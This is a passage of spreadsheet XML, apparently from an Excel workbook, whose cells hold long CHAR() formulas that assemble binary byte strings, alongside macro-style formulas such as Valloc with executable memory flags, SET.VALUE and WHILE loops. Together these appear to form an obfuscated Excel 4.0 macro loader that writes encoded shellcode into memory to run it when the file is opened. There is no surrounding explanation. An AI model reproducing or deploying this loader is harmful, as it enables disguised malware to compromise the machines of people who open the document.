        <f>CHAR(168)&amp;CHAR(250)&amp;CHAR(203)&amp;CHAR(36)&amp;CHAR(153)&amp;CHAR(123)&amp;CHAR(180)&amp;CHAR(232)&amp;CHAR(12)&amp;CHAR(26)&amp;CHAR(57)&amp;CHAR(230)&amp;CHAR(95)&amp;CHAR(181)&amp;CHAR(199)&amp;CHAR(252)&amp;CHAR(202)&amp;CHAR(235)&amp;CHAR(249)&amp;CHAR(184)&amp;CHAR(79)&amp;CHAR(38)&amp;CHAR(206)&amp;CHAR(80)&amp;CHAR(223)&amp;CHAR(158)&amp;CHAR(243)&amp;CHAR(114)&amp;CHAR(228)&amp;CHAR(103)&amp;CHAR(145)&amp;CHAR(205)&amp;CHAR(45)&amp;CHAR(178)&amp;CHAR(11)&amp;CHAR(77)&amp;CHAR(123)&amp;CHAR(179)&amp;CHAR(60)&amp;CHAR(2)&amp;CHAR(186)&amp;CHAR(178)&amp;CHAR(22)&amp;CHAR(110)&amp;CHAR(235)&amp;CHAR(238)&amp;CHAR(65)&amp;CHAR(169)&amp;CHAR(27)&amp;CHAR(3)&amp;CHAR(122)&amp;CHAR(50)&amp;CHAR(172)&amp;CHAR(12)&amp;CHAR(55)&amp;CHAR(7)&amp;CHAR(200)&amp;CHAR(235)&amp;CHAR(215)&amp;CHAR(111)&amp;CHAR(196)&amp;CHAR(20)&amp;CHAR(107)&amp;CHAR(116)&amp;CHAR(105)&amp;CHAR(88)&amp;CHAR(245)&amp;CHAR(67)&amp;CHAR(150)&amp;CHAR(80)&amp;CHAR(125)&amp;CHAR(216)&amp;CHAR(65)&amp;CHAR(31)&amp;CHAR(3)&amp;CHAR(42)&amp;CHAR(31)&amp;CHAR(174)&amp;CHAR(198)&amp;CHAR(223)&amp;CHAR(52)&amp;CHAR(42)&amp;CHAR(101)&amp;CHAR(213)&amp;CHAR(207)&amp;CHAR(200)&amp;CHAR(93)&amp;CHAR(56)&amp;CHAR(13)&amp;CHAR(178)&amp;CHAR(15)&amp;CHAR(67)&amp;CHAR(86)&amp;CHAR(162)&amp;CHAR(235)&amp;CHAR(25)&amp;CHAR(6)&amp;CHAR(42)&amp;CHAR(137)&amp;CHAR(89)&amp;CHAR(95)&amp;CHAR(209)&amp;CHAR(169)&amp;CHAR(217)&amp;CHAR(146)&amp;CHAR(204)&amp;CHAR(237)&amp;CHAR(234)&amp;CHAR(231)&amp;CHAR(68)&amp;CHAR(245)&amp;CHAR(20)&amp;CHAR(89)&amp;CHAR(185)&amp;CHAR(4)&amp;CHAR(110)&amp;CHAR(122)&amp;CHAR(173)&amp;CHAR(213)&amp;CHAR(175)&amp;CHAR(89)&amp;CHAR(169)&amp;CHAR(15)&amp;CHAR(229)&amp;CHAR(177)&amp;CHAR(9)&amp;CHAR(206)&amp;CHAR(39)&amp;CHAR(4)&amp;CHAR(192)&amp;CHAR(255)&amp;CHAR(36)&amp;CHAR(245)&amp;CHAR(8)&amp;CHAR(52)&amp;CHAR(181)&amp;CHAR(150)&amp;CHAR(237)&amp;CHAR(251)&amp;CHAR(202)&amp;CHAR(214)&amp;CHAR(248)&amp;CHAR(5)&amp;CHAR(26)&amp;CHAR(235)&amp;CHAR(112)&amp;CHAR(255)&amp;CHAR(143)&amp;CHAR(9)&amp;CHAR(150)&amp;CHAR(158)&amp;CHAR(189)&amp;CHAR(114)&amp;CHAR(49)&amp;CHAR(158)&amp;CHAR(60)&amp;CHAR(5)&amp;CHAR(100)&amp;CHAR(103)&amp;CHAR(36)&amp;CHAR(116)&amp;CHAR(202)&amp;CHAR(11)&amp;CHAR(169)&amp;CHAR(222)&amp;CHAR(235)&amp;CHAR(121)&amp;CHAR(129)&amp;CHAR(48)&amp;CHAR(116)&amp;CHAR(103)&amp;CHAR(204)&amp;CHAR(34)&amp;CHAR(97)&amp;CHAR(252)&amp;CHAR(182)&amp;CHAR(112)&amp;CHAR(21)&amp;CHAR(243)&amp;CHAR(221)&amp;CHAR(161)&amp;CHAR(138)&amp;CHAR(5)&amp;CHAR(35)&amp;CHAR(74)&amp;CHAR(180)&amp;CHAR(27)&amp;CHAR(223)&amp;CHAR(202)&amp;CHAR(166)&amp;CHAR(200)&amp;CHAR(130)&amp;CHAR(241)&amp;CHAR(30)&amp;CHAR(208)&amp;CHAR(105)&amp;CHAR(61)&amp;CHAR(79)&amp;CHAR(225)&amp;CHAR(170)&amp;CHAR(113)&amp;CHAR(249)&amp;CHAR(101)&amp;CHAR(90)&amp;CHAR(14)&amp;CHAR(73)&amp;CHAR(24)&amp;CHAR(174)&amp;CHAR(49)&amp;CHAR(152)&amp;CHAR(52)&amp;CHAR(55)&amp;CHAR(60)&amp;CHAR(87)&amp;CHAR(217)&amp;CHAR(117)&amp;CHAR(106)&amp;CHAR(2)&amp;CHAR(17)&amp;CHAR(131)&amp;CHAR(80)&amp;CHAR(112)&amp;CHAR(184)&amp;CHAR(165)&amp;CHAR(222)&amp;CHAR(99)&amp;CHAR(58)&amp;CHAR(145)&amp;CHAR(129)&amp;CHAR(4)&amp;CHAR(95)&amp;CHAR(121)&amp;CHAR(36)&amp;CHAR(97)&amp;CHAR(25)&amp;CHAR(184)&amp;CHAR(62)&amp;CHAR(164)&amp;CHAR(92)&amp;CHAR(154)&amp;CHAR(229)&amp;CHAR(244)&amp;CHAR(118)&amp;CHAR(63)&amp;CHAR(226)&amp;CHAR(120)&amp;CHAR(8)&amp;CHAR(102)&amp;CHAR(4)&amp;CHAR(42)&amp;CHAR(212)&amp;CHAR(224)&amp;CHAR(86)&amp;CHAR(205)&amp;CHAR(7)</f>
        <v>¨úË$™{´è_x000C__x001A_9æ_µÇüÊëù¸O&amp;ÎPßžóräg‘Í-²_x000B_M{³&lt;_x0002_º²_x0016_nëîA©_x001B__x0003_z2¬_x000C_7_x0007_Èë×oÄ_x0014_ktiXõC–P}ØA_x001F__x0003_*_x001F_®Æß4*eÕÏÈ]8_x000D_²_x000F_CV¢ë_x0019__x0006_*‰Y_Ñ©Ù’ÌíêçDõ_x0014_Y¹_x0004_nz­Õ¯Y©_x000F_å±	Î'_x0004_Àÿ$õ_x0008_4µ–íûÊÖø_x0005__x001A_ëpÿ	–ž½r1ž&lt;_x0005_dg$tÊ_x000B_©Þëy0tgÌ"aü¶p_x0015_óÝ¡Š_x0005_#J´_x001B_ßÊ¦È‚ñ_x001E_Ði=OáªqùeZ_x000E_I_x0018_®1˜47&lt;WÙuj_x0002__x0011_ƒPp¸¥Þc:‘_x0004__y$a_x0019_¸&gt;¤\šåôv?âx_x0008_f_x0004_*ÔàVÍ_x0007_</v>
      </c>
      <c r="C9" t="str">
        <f>CHAR(114)&amp;CHAR(81)&amp;CHAR(247)&amp;CHAR(254)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(140)&amp;CHAR(83)&amp;CHAR(187)&amp;CHAR(251)</f>
        <v>rQ÷þô6ŒS»û</v>
      </c>
    </row>
    <row r="10" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A10" t="e">
        <f>Valloc(0,65536,4096,64)</f>
        <v>#NAME?</v>
      </c>
      <c r="B10" t="str">
        <f>CHAR(81)&amp;CHAR(123)&amp;CHAR(23)&amp;CHAR(185)&amp;CHAR(28)&amp;CHAR(109)&amp;CHAR(80)&amp;CHAR(65)&amp;CHAR(57)&amp;CHAR(169)&amp;CHAR(18)&amp;CHAR(203)&amp;CHAR(181)&amp;CHAR(61)&amp;CHAR(48)&amp;CHAR(239)&amp;CHAR(58)&amp;CHAR(214)&amp;CHAR(124)&amp;CHAR(69)&amp;CHAR(130)&amp;CHAR(226)&amp;CHAR(60)&amp;CHAR(205)&amp;CHAR(81)&amp;CHAR(12)&amp;CHAR(229)&amp;CHAR(58)&amp;CHAR(16)&amp;CHAR(133)&amp;CHAR(215)&amp;CHAR(81)&amp;CHAR(246)&amp;CHAR(169)&amp;CHAR(239)&amp;CHAR(205)&amp;CHAR(90)&amp;CHAR(112)&amp;CHAR(148)&amp;CHAR(242)&amp;CHAR(142)&amp;CHAR(10)&amp;CHAR(100)&amp;CHAR(202)&amp;CHAR(160)&amp;CHAR(239)&amp;CHAR(207)&amp;CHAR(101)&amp;CHAR(164)&amp;CHAR(197)&amp;CHAR(51)&amp;CHAR(158)&amp;CHAR(40)&amp;CHAR(1)&amp;CHAR(30)&amp;CHAR(210)&amp;CHAR(164)&amp;CHAR(109)&amp;CHAR(135)&amp;CHAR(78)&amp;CHAR(97)&amp;CHAR(214)&amp;CHAR(80)&amp;CHAR(224)&amp;CHAR(240)&amp;CHAR(98)&amp;CHAR(89)&amp;CHAR(196)&amp;CHAR(32)&amp;CHAR(27)&amp;CHAR(156)&amp;CHAR(93)&amp;CHAR(78)&amp;CHAR(46)&amp;CHAR(12)&amp;CHAR(33)&amp;CHAR(53)&amp;CHAR(144)&amp;CHAR(242)&amp;CHAR(162)&amp;CHAR(174)&amp;CHAR(152)&amp;CHAR(253)&amp;CHAR(115)&amp;CHAR(32)&amp;CHAR(93)&amp;CHAR(176)&amp;CHAR(94)&amp;CHAR(231)&amp;CHAR(115)&amp;CHAR(62)&amp;CHAR(138)&amp;CHAR(38)&amp;CHAR(149)&amp;CHAR(245)&amp;CHAR(183)&amp;CHAR(255)&amp;CHAR(119)&amp;CHAR(147)&amp;CHAR(219)&amp;CHAR(183)&amp;CHAR(218)&amp;CHAR(241)&amp;CHAR(185)&amp;CHAR(143)&amp;CHAR(244)&amp;CHAR(167)&amp;CHAR(238)&amp;CHAR(183)&amp;CHAR(140)&amp;CHAR(137)&amp;CHAR(138)&amp;CHAR(82)&amp;CHAR(59)&amp;CHAR(97)&amp;CHAR(185)&amp;CHAR(20)&amp;CHAR(237)&amp;CHAR(223)&amp;CHAR(112)&amp;CHAR(114)&amp;CHAR(171)&amp;CHAR(38)&amp;CHAR(135)&amp;CHAR(68)&amp;CHAR(205)&amp;CHAR(176)&amp;CHAR(247)&amp;CHAR(88)&amp;CHAR(218)&amp;CHAR(172)&amp;CHAR(170)&amp;CHAR(151)&amp;CHAR(206)&amp;CHAR(126)&amp;CHAR(236)&amp;CHAR(20)&amp;CHAR(131)&amp;CHAR(252)&amp;CHAR(227)&amp;CHAR(30)&amp;CHAR(108)&amp;CHAR(156)&amp;CHAR(177)&amp;CHAR(203)&amp;CHAR(80)&amp;CHAR(172)&amp;CHAR(49)&amp;CHAR(234)&amp;CHAR(100)&amp;CHAR(151)&amp;CHAR(76)&amp;CHAR(227)&amp;CHAR(39)&amp;CHAR(80)&amp;CHAR(104)&amp;CHAR(166)&amp;CHAR(128)&amp;CHAR(28)&amp;CHAR(42)&amp;CHAR(186)&amp;CHAR(118)&amp;CHAR(148)&amp;CHAR(32)&amp;CHAR(244)&amp;CHAR(154)&amp;CHAR(4)&amp;CHAR(242)&amp;CHAR(211)&amp;CHAR(143)&amp;CHAR(71)&amp;CHAR(208)&amp;CHAR(22)&amp;CHAR(137)&amp;CHAR(75)&amp;CHAR(142)&amp;CHAR(244)&amp;CHAR(164)&amp;CHAR(32)&amp;CHAR(21)&amp;CHAR(235)&amp;CHAR(118)&amp;CHAR(4)&amp;CHAR(22)&amp;CHAR(168)&amp;CHAR(89)&amp;CHAR(2)&amp;CHAR(63)&amp;CHAR(41)&amp;CHAR(47)&amp;CHAR(240)&amp;CHAR(218)&amp;CHAR(11)&amp;CHAR(102)&amp;CHAR(147)&amp;CHAR(183)&amp;CHAR(206)&amp;CHAR(160)&amp;CHAR(169)&amp;CHAR(143)&amp;CHAR(46)&amp;CHAR(26)&amp;CHAR(175)&amp;CHAR(130)&amp;CHAR(246)&amp;CHAR(8)&amp;CHAR(125)&amp;CHAR(247)&amp;CHAR(64)&amp;CHAR(188)&amp;CHAR(163)&amp;CHAR(96)&amp;CHAR(253)&amp;CHAR(187)&amp;CHAR(64)&amp;CHAR(12)&amp;CHAR(170)&amp;CHAR(45)&amp;CHAR(190)&amp;CHAR(193)&amp;CHAR(58)&amp;CHAR(141)&amp;CHAR(89)&amp;CHAR(44)&amp;CHAR(131)&amp;CHAR(185)&amp;CHAR(249)&amp;CHAR(62)&amp;CHAR(185)&amp;CHAR(184)&amp;CHAR(217)&amp;CHAR(167)&amp;CHAR(198)&amp;CHAR(195)&amp;CHAR(5)&amp;CHAR(79)&amp;CHAR(11)&amp;CHAR(51)&amp;CHAR(106)&amp;CHAR(20)&amp;CHAR(92)&amp;CHAR(19)&amp;CHAR(161)&amp;CHAR(143)&amp;CHAR(206)&amp;CHAR(72)&amp;CHAR(76)&amp;CHAR(66)&amp;CHAR(99)&amp;CHAR(80)&amp;CHAR(83)&amp;CHAR(238)&amp;CHAR(248)&amp;CHAR(221)&amp;CHAR(178)</f>
        <v>Q{_x0017_¹_x001C_mPA9©_x0012_Ëµ=0ï:Ö|E‚â&lt;ÍQ_x000C_å:_x0010_…×Qö©ïÍZp”òŽ
dÊ ïÏe¤Å3ž(_x0001__x001E_Ò¤m‡NaÖPàðbYÄ _x001B_œ]N._x000C_!5ò¢®˜ýs ]°^çs&gt;Š&amp;•õ·ÿw“Û·Úñ¹ô§î·Œ‰ŠR;a¹_x0014_íßpr«&amp;‡DÍ°÷XÚ¬ª—Î~ì_x0014_ƒüã_x001E_lœ±ËP¬1êd—Lã'Ph¦€_x001C_*ºv” ôš_x0004_òÓGÐ_x0016_‰KŽô¤ _x0015_ëv_x0004__x0016_¨Y_x0002_?)/ðÚ_x000B_f“·Î ©._x001A_¯‚ö_x0008_}÷@¼£`ý»@_x000C_ª-¾Á:Y,ƒ¹ù&gt;¹¸Ù§ÆÃ_x0005_O_x000B_3j_x0014_\_x0013_¡ÎHLBcPSîøÝ²</v>
      </c>
      <c r="C10" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(181)&amp;CHAR(143)&amp;CHAR(201)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(8)&amp;CHAR(45)</f>
        <v>÷ýµÉë»ë_x0008_-</v>
      </c>
    </row>
    <row r="11" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A11" t="b">
        <f bx="1">main=#REF!</f>
        <v>0</v>
      </c>
      <c r="B11" t="str">
        <f>CHAR(244)&amp;CHAR(249)&amp;CHAR(85)&amp;CHAR(155)&amp;CHAR(137)&amp;CHAR(41)&amp;CHAR(152)&amp;CHAR(186)&amp;CHAR(220)&amp;CHAR(48)&amp;CHAR(17)&amp;CHAR(114)&amp;CHAR(212)&amp;CHAR(233)&amp;CHAR(22)&amp;CHAR(5)&amp;CHAR(63)&amp;CHAR(204)&amp;CHAR(5)&amp;CHAR(188)&amp;CHAR(221)&amp;CHAR(28)&amp;CHAR(146)&amp;CHAR(69)&amp;CHAR(157)&amp;CHAR(178)&amp;CHAR(208)&amp;CHAR(29)&amp;CHAR(196)&amp;CHAR(102)&amp;CHAR(142)&amp;CHAR(199)&amp;CHAR(206)&amp;CHAR(44)&amp;CHAR(244)&amp;CHAR(171)&amp;CHAR(160)&amp;CHAR(110)&amp;CHAR(137)&amp;CHAR(84)&amp;CHAR(243)&amp;CHAR(245)&amp;CHAR(145)&amp;CHAR(81)&amp;CHAR(11)&amp;CHAR(158)&amp;CHAR(234)&amp;CHAR(155)&amp;CHAR(198)&amp;CHAR(146)&amp;CHAR(231)&amp;CHAR(70)&amp;CHAR(136)&amp;CHAR(89)&amp;CHAR(226)&amp;CHAR(180)&amp;CHAR(187)&amp;CHAR(134)&amp;CHAR(62)&amp;CHAR(8)&amp;CHAR(213)&amp;CHAR(192)&amp;CHAR(193)&amp;CHAR(234)&amp;CHAR(151)&amp;CHAR(243)&amp;CHAR(231)&amp;CHAR(239)&amp;CHAR(46)&amp;CHAR(23)&amp;CHAR(189)&amp;CHAR(101)&amp;CHAR(208)&amp;CHAR(97)&amp;CHAR(103)&amp;CHAR(5)&amp;CHAR(8)&amp;CHAR(177)&amp;CHAR(183)&amp;CHAR(49)&amp;CHAR(214)&amp;CHAR(2)&amp;CHAR(141)&amp;CHAR(247)&amp;CHAR(103)&amp;CHAR(169)&amp;CHAR(59)&amp;CHAR(195)&amp;CHAR(192)&amp;CHAR(4)&amp;CHAR(111)&amp;CHAR(244)&amp;CHAR(84)&amp;CHAR(209)&amp;CHAR(244)&amp;CHAR(200)&amp;CHAR(2)&amp;CHAR(106)&amp;CHAR(76)&amp;CHAR(204)&amp;CHAR(56)&amp;CHAR(44)&amp;CHAR(128)&amp;CHAR(126)&amp;CHAR(165)&amp;CHAR(118)&amp;CHAR(57)&amp;CHAR(26)&amp;CHAR(124)&amp;CHAR(142)&amp;CHAR(194)&amp;CHAR(184)&amp;CHAR(225)&amp;CHAR(173)&amp;CHAR(201)&amp;CHAR(89)&amp;CHAR(91)&amp;CHAR(212)&amp;CHAR(189)&amp;CHAR(45)&amp;CHAR(32)&amp;CHAR(6)&amp;CHAR(189)&amp;CHAR(63)&amp;CHAR(212)&amp;CHAR(140)&amp;CHAR(62)&amp;CHAR(28)&amp;CHAR(206)&amp;CHAR(72)&amp;CHAR(144)&amp;CHAR(155)&amp;CHAR(222)&amp;CHAR(205)&amp;CHAR(68)&amp;CHAR(32)&amp;CHAR(85)&amp;CHAR(57)&amp;CHAR(86)&amp;CHAR(164)&amp;CHAR(69)&amp;CHAR(209)&amp;CHAR(187)&amp;CHAR(117)&amp;CHAR(194)&amp;CHAR(50)&amp;CHAR(133)&amp;CHAR(226)&amp;CHAR(253)&amp;CHAR(56)&amp;CHAR(87)&amp;CHAR(45)&amp;CHAR(245)&amp;CHAR(123)&amp;CHAR(47)&amp;CHAR(79)&amp;CHAR(138)&amp;CHAR(146)&amp;CHAR(109)&amp;CHAR(21)&amp;CHAR(197)&amp;CHAR(143)&amp;CHAR(189)&amp;CHAR(93)&amp;CHAR(214)&amp;CHAR(235)&amp;CHAR(74)&amp;CHAR(85)&amp;CHAR(40)&amp;CHAR(138)&amp;CHAR(147)&amp;CHAR(169)&amp;CHAR(168)&amp;CHAR(66)&amp;CHAR(224)&amp;CHAR(46)&amp;CHAR(51)&amp;CHAR(124)&amp;CHAR(246)&amp;CHAR(205)&amp;CHAR(81)&amp;CHAR(131)&amp;CHAR(253)&amp;CHAR(79)&amp;CHAR(94)&amp;CHAR(102)&amp;CHAR(129)&amp;CHAR(164)&amp;CHAR(57)&amp;CHAR(167)&amp;CHAR(106)&amp;CHAR(99)&amp;CHAR(148)&amp;CHAR(223)&amp;CHAR(120)&amp;CHAR(153)&amp;CHAR(72)&amp;CHAR(233)&amp;CHAR(144)&amp;CHAR(80)&amp;CHAR(152)&amp;CHAR(202)&amp;CHAR(26)&amp;CHAR(182)&amp;CHAR(107)&amp;CHAR(34)&amp;CHAR(149)&amp;CHAR(65)&amp;CHAR(55)&amp;CHAR(19)&amp;CHAR(201)&amp;CHAR(14)&amp;CHAR(28)&amp;CHAR(107)&amp;CHAR(133)&amp;CHAR(177)&amp;CHAR(166)&amp;CHAR(40)&amp;CHAR(72)&amp;CHAR(107)&amp;CHAR(103)&amp;CHAR(15)&amp;CHAR(26)&amp;CHAR(202)&amp;CHAR(31)&amp;CHAR(159)&amp;CHAR(86)&amp;CHAR(33)&amp;CHAR(91)&amp;CHAR(201)&amp;CHAR(232)&amp;CHAR(183)&amp;CHAR(51)&amp;CHAR(205)&amp;CHAR(121)&amp;CHAR(1)&amp;CHAR(252)&amp;CHAR(201)&amp;CHAR(248)&amp;CHAR(92)&amp;CHAR(249)&amp;CHAR(118)&amp;CHAR(235)&amp;CHAR(111)&amp;CHAR(88)&amp;CHAR(195)&amp;CHAR(37)&amp;CHAR(104)&amp;CHAR(193)&amp;CHAR(2)&amp;CHAR(16)&amp;CHAR(88)&amp;CHAR(95)&amp;CHAR(52)&amp;CHAR(155)</f>
        <v>ôùU›‰)˜ºÜ0_x0011_rÔé_x0016__x0005_?Ì_x0005_¼Ý_x001C_’E²Ð_x001D_ÄfŽÇÎ,ô« n‰Tóõ‘Q_x000B_žê›Æ’çFˆYâ´»†&gt;_x0008_ÕÀÁê—óçï._x0017_½eÐag_x0005__x0008_±·1Ö_x0002_÷g©;ÃÀ_x0004_oôTÑôÈ_x0002_jLÌ8,€~¥v9_x001A_|ŽÂ¸á­ÉY[Ô½- _x0006_½?ÔŒ&gt;_x001C_ÎH›ÞÍD U9V¤EÑ»uÂ2…âý8W-õ{/OŠ’m_x0015_Å½]ÖëJU(Š“©¨Bà.3|öÍQƒýO^f¤9§jc”ßx™HéP˜Ê_x001A_¶k"•A7_x0013_É_x000E__x001C_k…±¦(Hkg_x000F__x001A_Ê_x001F_ŸV![Éè·3Íy_x0001_üÉø\ùvëoXÃ%hÁ_x0002__x0010_X_4›</v>
      </c>
      <c r="C11" t="str">
        <f>CHAR(113)&amp;CHAR(246)&amp;CHAR(194)&amp;CHAR(111)&amp;CHAR(110)&amp;CHAR(239)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(145)&amp;CHAR(126)</f>
        <v>qöÂonï÷ý‘~</v>
      </c>
    </row>
    <row r="12" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A12" t="b">
        <f>SET.VALUE(#REF!,0)</f>
        <v>0</v>
      </c>
      <c r="B12" t="str">
        <f>CHAR(4)&amp;CHAR(135)&amp;CHAR(202)&amp;CHAR(112)&amp;CHAR(58)&amp;CHAR(44)&amp;CHAR(29)&amp;CHAR(99)&amp;CHAR(82)&amp;CHAR(185)&amp;CHAR(142)&amp;CHAR(223)&amp;CHAR(216)&amp;CHAR(207)&amp;CHAR(34)&amp;CHAR(9)&amp;CHAR(193)&amp;CHAR(239)&amp;CHAR(52)&amp;CHAR(235)&amp;CHAR(113)&amp;CHAR(209)&amp;CHAR(235)&amp;CHAR(200)&amp;CHAR(248)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(125)&amp;CHAR(81)&amp;CHAR(166)&amp;CHAR(102)&amp;CHAR(97)&amp;CHAR(98)&amp;CHAR(70)&amp;CHAR(176)&amp;CHAR(112)&amp;CHAR(194)&amp;CHAR(30)&amp;CHAR(74)&amp;CHAR(204)&amp;CHAR(135)&amp;CHAR(158)&amp;CHAR(141)&amp;CHAR(147)&amp;CHAR(233)&amp;CHAR(33)&amp;CHAR(64)&amp;CHAR(125)&amp;CHAR(189)&amp;CHAR(107)&amp;CHAR(244)&amp;CHAR(242)&amp;CHAR(186)&amp;CHAR(36)&amp;CHAR(194)&amp;CHAR(147)&amp;CHAR(80)&amp;CHAR(75)&amp;CHAR(98)&amp;CHAR(242)&amp;CHAR(171)&amp;CHAR(173)&amp;CHAR(244)&amp;CHAR(96)&amp;CHAR(101)&amp;CHAR(159)&amp;CHAR(153)&amp;CHAR(252)&amp;CHAR(127)&amp;CHAR(187)&amp;CHAR(138)&amp;CHAR(13)&amp;CHAR(82)&amp;CHAR(38)&amp;CHAR(123)&amp;CHAR(54)&amp;CHAR(18)&amp;CHAR(131)&amp;CHAR(23)&amp;CHAR(179)&amp;CHAR(67)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(160)&amp;CHAR(138)&amp;CHAR(156)&amp;CHAR(227)&amp;CHAR(126)&amp;CHAR(183)&amp;CHAR(183)&amp;CHAR(173)&amp;CHAR(169)&amp;CHAR(152)&amp;CHAR(52)&amp;CHAR(128)&amp;CHAR(253)&amp;CHAR(65)&amp;CHAR(83)&amp;CHAR(84)&amp;CHAR(162)&amp;CHAR(173)&amp;CHAR(72)&amp;CHAR(34)&amp;CHAR(17)&amp;CHAR(117)&amp;CHAR(54)&amp;CHAR(80)&amp;CHAR(217)&amp;CHAR(125)&amp;CHAR(156)&amp;CHAR(213)&amp;CHAR(170)&amp;CHAR(225)&amp;CHAR(224)&amp;CHAR(56)&amp;CHAR(59)&amp;CHAR(73)&amp;CHAR(168)&amp;CHAR(207)&amp;CHAR(203)&amp;CHAR(235)&amp;CHAR(162)&amp;CHAR(233)&amp;CHAR(63)&amp;CHAR(71)&amp;CHAR(137)&amp;CHAR(137)&amp;CHAR(79)&amp;CHAR(114)&amp;CHAR(237)&amp;CHAR(134)&amp;CHAR(181)&amp;CHAR(41)&amp;CHAR(30)&amp;CHAR(11)&amp;CHAR(56)&amp;CHAR(207)&amp;CHAR(240)&amp;CHAR(213)&amp;CHAR(215)&amp;CHAR(53)&amp;CHAR(93)&amp;CHAR(169)&amp;CHAR(56)&amp;CHAR(247)&amp;CHAR(33)&amp;CHAR(60)&amp;CHAR(6)&amp;CHAR(189)&amp;CHAR(250)&amp;CHAR(167)&amp;CHAR(52)&amp;CHAR(63)&amp;CHAR(13)&amp;CHAR(120)&amp;CHAR(180)&amp;CHAR(179)&amp;CHAR(130)&amp;CHAR(130)&amp;CHAR(24)&amp;CHAR(47)&amp;CHAR(223)&amp;CHAR(58)&amp;CHAR(10)&amp;CHAR(66)&amp;CHAR(162)&amp;CHAR(114)&amp;CHAR(144)&amp;CHAR(15)&amp;CHAR(106)&amp;CHAR(132)&amp;CHAR(254)&amp;CHAR(136)&amp;CHAR(78)&amp;CHAR(209)&amp;CHAR(84)&amp;CHAR(223)&amp;CHAR(35)&amp;CHAR(92)&amp;CHAR(141)&amp;CHAR(157)&amp;CHAR(111)&amp;CHAR(4)&amp;CHAR(203)&amp;CHAR(117)&amp;CHAR(122)&amp;CHAR(152)&amp;CHAR(210)&amp;CHAR(35)&amp;CHAR(247)&amp;CHAR(120)&amp;CHAR(255)&amp;CHAR(215)&amp;CHAR(59)&amp;CHAR(33)&amp;CHAR(81)&amp;CHAR(207)&amp;CHAR(87)&amp;CHAR(224)&amp;CHAR(54)&amp;CHAR(22)&amp;CHAR(9)&amp;CHAR(17)&amp;CHAR(231)&amp;CHAR(93)&amp;CHAR(143)&amp;CHAR(255)&amp;CHAR(243)&amp;CHAR(4)&amp;CHAR(141)&amp;CHAR(254)&amp;CHAR(202)&amp;CHAR(243)&amp;CHAR(209)&amp;CHAR(84)&amp;CHAR(178)&amp;CHAR(97)&amp;CHAR(133)&amp;CHAR(205)&amp;CHAR(191)&amp;CHAR(13)&amp;CHAR(73)&amp;CHAR(21)&amp;CHAR(76)&amp;CHAR(194)&amp;CHAR(53)&amp;CHAR(197)&amp;CHAR(170)&amp;CHAR(66)&amp;CHAR(118)&amp;CHAR(83)&amp;CHAR(232)&amp;CHAR(33)&amp;CHAR(56)&amp;CHAR(101)&amp;CHAR(178)&amp;CHAR(98)&amp;CHAR(212)&amp;CHAR(210)&amp;CHAR(91)&amp;CHAR(44)&amp;CHAR(53)&amp;CHAR(182)&amp;CHAR(235)&amp;CHAR(98)&amp;CHAR(80)&amp;CHAR(241)&amp;CHAR(121)&amp;CHAR(48)&amp;CHAR(244)&amp;CHAR(231)&amp;CHAR(184)&amp;CHAR(149)&amp;CHAR(195)&amp;CHAR(174)</f>
        <v>_x0004_‡Êp:,_x001D_cR¹ŽßØÏ"	Áï4ëqÑëÈøê‘}Q¦fabF°pÂ_x001E_JÌ‡ž“é!@}½kôòº$Â“PKbò«­ô`eŸ™ü»Š_x000D_R&amp;{6_x0012_ƒ_x0017_³C!À Šœã~··­©˜4€ýAST¢­H"_x0011_u6PÙ}œÕªáà8;I¨ÏËë¢é?G‰‰Orí†µ)_x001E__x000B_8ÏðÕ×5]©8÷!&lt;_x0006_½ú§4?_x000D_x´³‚‚_x0018_/ß:
B¢r_x000F_j„þˆNÑTß#\o_x0004_Ëuz˜Ò#÷xÿ×;!QÏWà6_x0016_	_x0011_ç]ÿó_x0004_þÊóÑT²a…Í¿_x000D_I_x0015_LÂ5ÅªBvSè!8e²bÔÒ[,5¶ëbPñy0ôç¸•Ã®</v>
      </c>
      <c r="C12" t="str">
        <f>CHAR(70)&amp;CHAR(223)&amp;CHAR(158)&amp;CHAR(219)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(126)&amp;CHAR(68)&amp;CHAR(173)</f>
        <v>FßžÛ÷ýô~D­</v>
      </c>
    </row>
    <row r="13" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A13" t="b">
        <f>WHILE(main&lt;&gt;"excel")</f>
        <v>0</v>
      </c>
      <c r="B13" t="str">
        <f>CHAR(202)&amp;CHAR(48)&amp;CHAR(127)&amp;CHAR(87)&amp;CHAR(104)&amp;CHAR(172)&amp;CHAR(59)&amp;CHAR(197)&amp;CHAR(15)&amp;CHAR(92)&amp;CHAR(104)&amp;CHAR(108)&amp;CHAR(234)&amp;CHAR(226)&amp;CHAR(49)&amp;CHAR(125)&amp;CHAR(163)&amp;CHAR(214)&amp;CHAR(166)&amp;CHAR(74)&amp;CHAR(119)&amp;CHAR(244)&amp;CHAR(223)&amp;CHAR(175)&amp;CHAR(110)&amp;CHAR(164)&amp;CHAR(51)&amp;CHAR(160)&amp;CHAR(243)&amp;CHAR(171)&amp;CHAR(75)&amp;CHAR(239)&amp;CHAR(5)&amp;CHAR(119)&amp;CHAR(242)&amp;CHAR(37)&amp;CHAR(97)&amp;CHAR(141)&amp;CHAR(131)&amp;CHAR(135)&amp;CHAR(171)&amp;CHAR(4)&amp;CHAR(121)&amp;CHAR(98)&amp;CHAR(29)&amp;CHAR(198)&amp;CHAR(42)&amp;CHAR(201)&amp;CHAR(182)&amp;CHAR(213)&amp;CHAR(89)&amp;CHAR(7)&amp;CHAR(251)&amp;CHAR(11)&amp;CHAR(63)&amp;CHAR(61)&amp;CHAR(23)&amp;CHAR(111)&amp;CHAR(188)&amp;CHAR(79)&amp;CHAR(102)&amp;CHAR(154)&amp;CHAR(209)&amp;CHAR(38)&amp;CHAR(163)&amp;CHAR(172)&amp;CHAR(160)&amp;CHAR(24)&amp;CHAR(35)&amp;CHAR(17)&amp;CHAR(130)&amp;CHAR(33)&amp;CHAR(11)&amp;CHAR(78)&amp;CHAR(36)&amp;CHAR(123)&amp;CHAR(57)&amp;CHAR(12)&